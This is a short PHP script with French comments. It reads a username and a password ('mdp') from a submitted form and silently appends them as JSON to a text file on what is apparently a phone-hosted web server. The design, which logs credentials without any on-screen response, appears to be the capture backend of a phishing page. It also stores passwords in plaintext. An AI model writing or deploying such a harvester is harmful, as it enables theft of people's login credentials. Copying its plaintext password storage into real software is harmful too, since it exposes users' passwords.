
<?php
$donnees = [
 'User' => $_POST['user'],
 'mdp' => $_POST['mdp']
];

// Convertir en JSON
$data_json = json_encode($donnees);

// Chemin du fichier où stocker les données
$fichier = "/storage/emulated/0/htdocs/donnes.txt";

// Enregistrement dans le fichier sans afficher à l'écran
file_put_contents($fichier, $data_json . PHP_EOL, FILE_APPEND);
?>

